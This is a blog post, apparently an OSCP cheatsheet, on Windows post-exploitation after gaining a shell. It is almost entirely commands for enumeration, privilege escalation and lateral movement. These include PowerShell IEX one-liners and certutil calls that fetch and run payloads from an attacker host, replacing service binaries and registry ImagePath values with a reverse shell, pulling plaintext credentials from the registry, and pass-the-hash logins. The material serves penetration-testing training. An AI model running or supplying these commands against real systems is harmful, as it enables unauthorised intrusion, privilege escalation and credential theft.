---
title: Windows Post Exploitation
date: 2020-06-26 18:05:42
tags: [oscp, cheatsheet, windows]
---

# Total Windows Post Exploitation

So you got a shell, what *now*?

This post will help you with local enumeration as well as escalate your privileges further.

Usage of different enumeration scripts and tools is encouraged, my favourite is WinPEAS.
WinPeas can be found [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Keep in mind:
* To exploit services or registry, you require:
    * appropriate write permissions
    * service start permission
    * service stop permission
* To exploit AutoLogon services:
    * Permissions to restart the machine
* Look for non-standard programs on the system

``` powershell
# "$" : Kali,
# "PS>" : PowerShell,
# null : CMD
whoami
echo %username%
whoami /all

hostname
echo %hostname%

net users
net users username

# Note hostname, patches, architecture
systeminfo

# Both should be the same for ease of exploitation
PS> [environment]::Is64BitOperatingSystem
PS> [environment]::Is64BitProcess

# all, addresses:port, PID
netstat -ano


# use double-quotes if file path has spaces in it 
$ sudo impacket-smbserver abcd /path/to/serve

# mount drives
net use abcd: \\kali_ip\myshare
net use abcd: /d # disconnect
net use abcd: /delete # then delete
PS> New-PSDrive -Name "abcd" -PSProvider "FileSystem" -Root "\\ip\abcd"
PS> Remove-PSDrive -Name abcd

# OR copy directly from the share without mounting
copy //kali_ip/abcd/file_name C:\path\to\save
copy C:\path\to\file //kali_ip/abcd
copy "C:\Program Files\..\legit.exe" C:\Temp
copy /Y C:\Downloads\shell.exe "C:\Program Files\...\legit.exe"

# Download to Windows
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/file')"
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://ip/file','C:\Users\Public\Downloads\file')"
powershell.exe -nop -ep bypass -c "IWR -URI 'http://ip/file' -Outfile file['/path/to/file']"
certutil -urlcache -f http://kali_ip/file file


# Run winPEAS
# For color: 
	# > REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
	# > cmd.exe
.\winpeasany.exe quiet

# .\accesschk.exe /accepteula
# -c : Name a windows service, or use * for all
# -d : Only process directories
# -k : Name a registry key e.g., hklm/software
# -q : Omit banner
# -s : Recurse
# -u : Suppress errors
# -v : Verbose
# -w : Show objects with write access
# Check service permissions
# ALWAYS RUN THE FOLLOWING TO CHECK IF YOU'VE PERMISSIONS TO START AND STOP THE SERVICE
.\accesschk.exe /accepteula -ucqv <user> <svc_name>
# Get all writable services as per groups
.\accesschk.exe /accepteual -uwcqv Users *
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
# Is dir writable? - Unquoted service paths
.\accesschk.exe /accepteula -uwdv "C:\Program Files"
# User permissions on an executable
.\accesschk.exe /accepteula -uqv "C:\Program Files\...\file.exe"
# Find all weak permissions - folders
.\accesschk.exe /accepteula -uwdqs Users c:\
.\accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
# Find all weak permissions - files
.\accesschk.exe /accepteula -uwqs Users c:\*.*
.\accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
# Registry ACL - Weak registry permissions
.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\svc_name
PS> Get-Acl HKLM\System\CurrentControlSet\Services\svc_name | Format-List

# Get rights of any file, or folder
PS> (get-acl C:\path\to\file).access | ft IdentityReference,FileSystemRights,AccessControlType

# Query service configuration
# Verify after doing all the changes
sc qc svc
# Current state of the service
sc query svc
# Modify config
sc config svc binpath= "\"C:\Downloads\shell.exe\""
# if dependencies exist
sc config depend_svc start= auto
net start depend_svc
net start svc
# can instead remove dependency too
sc config svc depend= ""
# Start/stop the service
net start/stop svc

# Query configuration of registry entry of the service
reg query HKLM\System\CurrentControlSet\Services\svc_name
# Point the ImagePath to malicious executable
reg add HKLM\SYSTEM\CurrentControlSet\services\svc_name /v ImagePath /t REG_EXPAND_SZ /d C:\path\shell.exe /f
# Start/stop the service to get the shell
net start/stop svc

# manually, 0x1 is the desired output
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated


# Common creds location, always in plaintext
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogin"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# If found, prints the location of the file
dir /s filename # or extensions


# Found creds?
# --system only works if admin creds are on hand
$ winexe -U 'admin%pass123' [--system] //10.10.10.10 cmd.exe

runas /savecred /user:admin C:\abcd\reverse.exe

PS> $password = ConvertTo-SecureString 'pass123' -AsPlainText -Force
PS> $cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
PS> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://kali_ip/shell.ps1')" -Credential $cred

# Hashes - Passwords
$ pth-winexe -U 'domain\admin%LM:NTLM' [--system] //10.10.10.10 cmd.exe

# If some port are listening on the target machine but inaccessible, forward the ports - Port Forwarding
# winexe, pth-winexe works on 445, MySQL on 3306
# On KALI
$ ./chisel server --reverse --port 9001
# On Windows
> .\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT

winexe -U 'administrator%pass123' --system //127.0.0.1 KALI_PORT 
mysql --host=127.0.0.1 --port=KALI_PORT -u username -p

# Find exploits
# .\windows-exploit-suggester.py --update
.\windows-exploit-suggester.py -i systeminfo.txt -d 2020-xxx.xlsx
```